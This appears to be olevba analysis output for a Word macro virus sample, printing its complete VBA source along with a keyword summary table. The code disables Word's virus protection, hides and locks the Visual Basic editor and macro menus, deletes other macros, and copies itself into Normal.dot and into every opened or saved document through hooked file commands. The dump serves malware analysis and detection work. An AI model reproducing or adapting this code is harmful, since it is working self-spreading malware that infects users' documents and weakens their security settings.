olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.CyberHack-based-9df9003c54e8bb8b136ea2609b15113fe9eaf478
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ChenLung 
in file: Virus.MSWord.CyberHack-based-9df9003c54e8bb8b136ea2609b15113fe9eaf478 - OLE stream: 'ChenLung'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 







































Private Sub OK_Click()
Unload Me
End Sub
-------------------------------------------------------------------------------
VBA MACRO LungChen 
in file: Virus.MSWord.CyberHack-based-9df9003c54e8bb8b136ea2609b15113fe9eaf478 - OLE stream: 'LungChen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Created and Programmed By. June 8, 1971
'©April, 1998 - Ciputat
'Sorry, If my program disturbs you !

Public Mulai
Public SimpanFile
Public Ay
Public Sun
Sub AyAlways()
    Mulai = Application.DisplayAlerts
    Application.DisplayAlerts = wdAlertsNone
    Call Cek
    WordBasic.DisableAutoMacros 0
    CommandBars("Visual Basic").Visible = False
    CommandBars("Visual Basic").Enabled = False
    CommandBars("Visual Basic").Protection = msoBarNoChangeVisible
    CommandBars("Visual Basic").Protection = msoBarNoCustomize
    On Error Resume Next
    CommandBars("Tools").Controls("Macro").Delete
    CustomizationContext = NormalTemplate
    FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
    FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
    On Error GoTo 0
End Sub
Sub AyClose()
Application.DisplayAlerts = Mulai
End Sub
Sub Ay2()
    Call Cek
    On Error GoTo AyErr1
    Ay = False
    Set ad = ActiveDocument
    Set nt = NormalTemplate
    On Error GoTo Error1a
    For i = 1 To nt.VBProject.VBComponents.Count
      NMacr = nt.VBProject.VBComponents(i).Name
      If NMacr = "LungChen" Then Ay = True
      If (NMacr <> "LungChen") And (NMacr <> "ChenLung") And (NMacr <> "ThisDocument") Then
        Application.OrganizerDelete Source:=nt.FullName, _
            Name:=NMacr, Object:=wdOrganizerObjectProjectItems
      End If
    Next i
Error1a:
    If Ay = False Then
      On Error GoTo Error1
      Application.OrganizerCopy Source:=ad.FullName, _
          Destination:=nt.FullName, Name:= _
          "LungChen", Object:=wdOrganizerObjectProjectItems
      Application.OrganizerCopy Source:=ad.FullName, _
          Destination:=nt.FullName, Name:= _
          "ChenLung", Object:=wdOrganizerObjectProjectItems
      Templates(nt.FullName).Save
Error1:
    End If
AyErr1:
End Sub
Sub Ay2Doc()
    On Error GoTo AyErr2
    SimpanFile = 0
    Sun = False
    Set ad = ActiveDocument
    Set nt = NormalTemplate
    On Error GoTo Error2a
    For i = 1 To ad.VBProject.VBComponents.Count
      NMacr = ad.VBProject.VBComponents(i).Name
      If NMacr = "LungChen" Then Sun = True
      NMacr = nt.VBProject.VBComponents(i).Name
      If NMacr = "LungChen" Then Sun = True
      If (NMacr <> "LungChen") And (NMacr <> "ChenLung") And _
        (NMacr <> "ThisDocument") And (NMacr <> "Reference to Normal") Then
        Application.OrganizerDelete Source:=ad.FullName, _
          Name:=NMacr, Object:=wdOrganizerObjectProjectItems
      End If
    Next i
Error2a:
    If Sun = False Then
      On Error GoTo Error2
      Application.OrganizerCopy Source:=nt.FullName, _
          Destination:=ad.FullName, Name:= _
          "LungChen", Object:=wdOrganizerObjectProjectItems
      Application.OrganizerCopy Source:=nt.FullName, _
          Destination:=ad.FullName, Name:= _
          "ChenLung", Object:=wdOrganizerObjectProjectItems
      SimpanFile = 1
Error2:
    End If
AyErr2:
End Sub
Sub Lulung()
    Call AyAlways
    Call Ay2
    Call AyClose
End Sub
Sub Cek()
    With Options
        .VirusProtection = False
        .SaveNormalPrompt = False
    End With
End Sub
Sub Simpan()
    On Error GoTo Error4
Set ad = ActiveDocument
    If SimpanFile = 1 Then
       ad.SaveAs FileName:=ad.Name, FileFormat:=wdFormatDocument
    End If
Error4:
End Sub
Sub AutoOpen()
    If Day(Now()) = 8 And Month(Now()) = 6 Then ChenLung.Show
    Call Lulung
End Sub
Sub FileClose()
    Call AyAlways
    Call Ay2
    Call Ay2Doc
    Call AyClose
    WordBasic.FileClose
End Sub
Sub FileOpen()
    Call Lulung
    Dialogs(wdDialogFileOpen).Show
    Call AyAlways
    Call Ay2Doc
    Call Simpan
    Call AyClose
    If Day(Now()) = 8 And Month(Now()) = 6 Then ChenLung.Show
End Sub
Sub FileSaveAs()
    Call AyAlways
    Call Ay2
    Call Ay2Doc
    Call AyClose
    Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub FileSave()
    Call AyAlways
    Call Ay2
    Call Ay2Doc
    Call AyClose
    On Error GoTo Errh1
    If ActiveDocument.Saved = False Then ActiveDocument.Save
Errh1:
End Sub
Sub HelpAbout()
    On Error GoTo AyErr3
    ChenLung.Show
AyErr3:
End Sub
Sub ToolsOptions()
    Dialogs(wdDialogToolsOptions).Show
    Call Lulung
    ChenLung.Show
End Sub
Sub FileNew()
    Call Lulung
    Dialogs(wdDialogFileNew).Show
End Sub
Sub FileExit()
    Call AyAlways
    Call Ay2
    Call Ay2Doc
    On Error GoTo AyErr4
    If Day(Now()) = 8 And Month(Now()) = 6 Then ChenLung.Show
AyErr4:
    Call AyClose
    WordBasic.FileExit
End Sub
Sub FileTemplates()
    Call Lulung
End Sub
Sub ToolsCustomizeKeyboard()
    Call Lulung
End Sub
Sub ViewVBCode()
    Call Lulung
End Sub
Sub Organizer()
End Sub
Sub ToolsMacro()
    Call Lulung
    ChenLung.Show
End Sub
Sub ToolsCustomize()
    Call Lulung
    ChenLung.Show
End Sub
-------------------------------------------------------------------------------
VBA MACRO ThisDocument 
in file: Virus.MSWord.CyberHack-based-9df9003c54e8bb8b136ea2609b15113fe9eaf478 - OLE stream: 'ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |OK_Click            |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

